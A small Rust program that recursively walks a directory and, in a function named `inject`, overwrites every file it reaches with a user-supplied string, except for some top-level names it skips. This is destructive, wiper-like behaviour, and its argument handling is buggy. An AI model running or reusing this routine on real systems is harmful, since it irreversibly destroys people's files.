use std::{env::args, path::{Path, PathBuf}};

#[allow(unused_must_use)]
fn main() {
    let _args = args().skip(1);
    let args_length = _args.len();

    if args_length < 2 { panic!("Insufficient number of arguments provided.") }

    let capacity = if args_length > 2 { args_length - 1 } else { args_length };

    let mut args: Vec<String> = Vec::with_capacity(capacity);
    args.extend(_args);

    let filters = &args[3..];

    let root_entries = std::fs::read_dir(&args[0]).unwrap().filter_map(|d| {
        if d.is_ok() {
             let dir_ok = d.ok().unwrap();
             if !filters.contains(&dir_ok.file_name().into_string().unwrap()) { Some(dir_ok.path())  } else { None }
        } else { None }
    }).collect::<Vec<PathBuf>>();

    for d in &root_entries {
        read_dir_recursively(d, &args[1], &root_entries);
    }
 }

#[allow(unused_must_use)]
fn read_dir_recursively<P, T>(path: P, alias: &str, root_entries: &Vec<T>) -> Result<(), std::io::Error>
where
    P: AsRef<Path>,
    T: AsRef<Path>
{
   let directories = std::fs::read_dir(path)?.filter_map(|d| d.ok()).collect::<Vec<_>>();
     for d in directories {
         println!("{:?}", d.file_name());
         let dir_metadata = d.metadata().unwrap();
            if dir_metadata.is_dir() { read_dir_recursively(d.path(), alias, &root_entries); } 
            else if dir_metadata.is_file() { inject(d.path(), alias); }
   }

    Ok(())
}

#[allow(unused_must_use)]
fn inject<P>(path: P, alias: &str) 
where 
    P: AsRef<Path>
{   
    std::fs::write(path, alias); // TODO
}